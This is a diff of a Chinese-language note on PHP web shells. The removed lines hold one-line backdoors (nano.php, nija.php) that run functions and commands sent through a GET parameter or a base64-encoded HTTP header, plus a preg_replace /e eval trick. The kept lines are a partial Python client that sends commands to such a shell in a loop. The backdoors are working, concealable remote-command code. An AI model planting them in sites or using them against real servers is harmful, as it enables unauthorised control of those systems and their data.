@@ -1,43 +1,3 @@
-# 原理和演示
-
-## test123.php
-
-post数据存储到session解密后利用preg_replace()函数的漏洞
-
-'a'eis eval()
-
-![](assets/markdown-img-paste-20180418174645451.png)
-
-## nano.php
-
-```php
-<?php $x=$_GET;($x[p]=='123456'?$x[f]($x[c]):y);
-```
-
-![](assets/markdown-img-paste-20180530102427143.png)
-
-参数解释  
-- p 密码可以自定义
-- f 要执行的函数
-- c 要执行的命令
-
-## nija.php
-
-```php
-<?php $h=getallheaders();$x=explode('~',base64_decode(substr($h['x'],1)));@$x[0]($x[1]);
-```
-
-参数解释  
-- $h 保存所有的http请求的header信息
-- $x 保存执行的函数和命令
-
-`system~ls` `base64`后 `c3lzdGVtfmxzCg==` 任意加一个字符在加密后的字符串前面是为了配合`substr`函数
-
-![](assets/markdown-img-paste-20180530105351444.png)
-
-### nano.php nija.php 使用繁琐
-
-```python
 import requests
 import sys
 import random
@@ -101,17 +61,3 @@ def requester(url, payload, shell):
 while True:
     payload = input('%s>%s ' % (green, end))
     requester(url, payload, shell)
-
-```
-
-![](assets/markdown-img-paste-20180530110218131.png)
-
-[参考的原文地址][41432a7c]
-
-
-
-
-
-
-
-  [41432a7c]: https://github.com/UltimateHackers/nano "原文"
